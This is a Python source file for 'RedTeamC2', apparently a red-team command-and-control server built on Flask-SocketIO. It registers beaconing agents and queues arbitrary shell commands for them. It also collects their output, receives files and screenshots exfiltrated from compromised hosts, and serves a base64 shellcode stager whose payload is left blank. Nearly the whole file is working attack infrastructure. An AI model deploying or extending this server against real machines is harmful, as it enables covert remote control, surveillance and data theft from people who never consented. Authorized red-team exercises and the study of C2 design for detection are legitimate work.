"""
server.py
Flask-SocketIO app entry point for RedTeamC2
"""

from flask import Flask, render_template, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
import ssl, os, sys, base64, uuid, time
from werkzeug.utils import secure_filename

app = Flask(__name__, template_folder='templates')
socketio = SocketIO(app)

# In-memory storage
agents = {}
tasks = {}
results = {}

UPLOAD_FOLDER = '../c2server/uploads'
SCREENSHOT_FOLDER = '../c2server/screenshots'
STAGER_PAYLOAD = b''  # Set this to your shellcode as needed
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)

@app.route('/')
def index():
    try:
        return render_template('index.html', agents=agents)
    except Exception as e:
        return f'<h1>Template Error</h1><p>{e}</p>', 500

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.get_data()
    agent_id = request.headers.get('X-Agent-ID') or str(uuid.uuid4())
    sysinfo = base64.b64decode(data).decode(errors='ignore')
    agents[agent_id] = {'id': agent_id, 'sysinfo': sysinfo, 'last_seen': time.time()}
    socketio.emit('agent_update', {'agents': list(agents.values())})
    # Get next task for this agent
    task = tasks.pop(agent_id, None)
    if task:
        return base64.b64encode(task.encode()).decode()
    return base64.b64encode(b'').decode()

@app.route('/api/result', methods=['POST'])
def result():
    agent_id = request.headers.get('X-Agent-ID')
    data = request.get_data()
    output = base64.b64decode(data).decode(errors='ignore')
    if agent_id:
        results.setdefault(agent_id, []).append(output)
        socketio.emit('result_update', {'agent_id': agent_id, 'result': output})
    return 'OK'

@app.route('/api/task', methods=['POST'])
def task():
    agent_id = request.form['agent_id']
    cmd = request.form['cmd']
    tasks[agent_id] = cmd
    return 'Task queued'

@app.route('/api/upload', methods=['POST'])
def upload():
    agent_id = request.form['agent_id']
    file = request.files.get('file')
    if not file or not file.filename:
        return 'No file uploaded', 400
    filename = secure_filename(file.filename)
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    return 'File uploaded'

@app.route('/api/screenshot', methods=['POST'])
def screenshot():
    agent_id = request.form['agent_id']
    file = request.files.get('screenshot')
    if not file or not file.filename:
        return 'No screenshot uploaded', 400
    filename = secure_filename(file.filename)
    file.save(os.path.join(SCREENSHOT_FOLDER, filename))
    return 'Screenshot uploaded'

@app.route('/uploads/<filename>')
def get_upload(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route('/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOT_FOLDER, filename)

@app.route('/api/stager', methods=['GET'])
def stager():
    # Return shellcode payload (base64)
    return base64.b64encode(STAGER_PAYLOAD)

@app.route('/api/agents')
def api_agents():
    return jsonify(list(agents.values()))

@app.route('/api/results/<agent_id>')
def api_results(agent_id):
    return jsonify(results.get(agent_id, []))

# SOCKS handler stub
@app.route('/api/socks', methods=['POST'])
def socks():
    return 'SOCKS handler not implemented yet'

if __name__ == '__main__':
    cert_path = '../certs/c2.crt'
    key_path = '../certs/c2.key'
    if os.path.exists(cert_path) and os.path.exists(key_path):
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_path, key_path)
            print(f"[*] Using SSL certs: {cert_path}, {key_path}")
            socketio.run(app, host='0.0.0.0', port=5000, ssl_context=context)
        except Exception as e:
            print(f"[!] SSL error: {e}\nRun this command to generate certs if needed:")
            print("openssl req -x509 -newkey rsa:4096 -keyout certs/c2.key -out certs/c2.crt -days 365 -nodes -subj '/CN=localhost'")
            sys.exit(1)
    else:
        print("[!] SSL certs not found. Running without SSL on http://localhost:5000 (not secure)")
        socketio.run(app, host='0.0.0.0', port=5000)
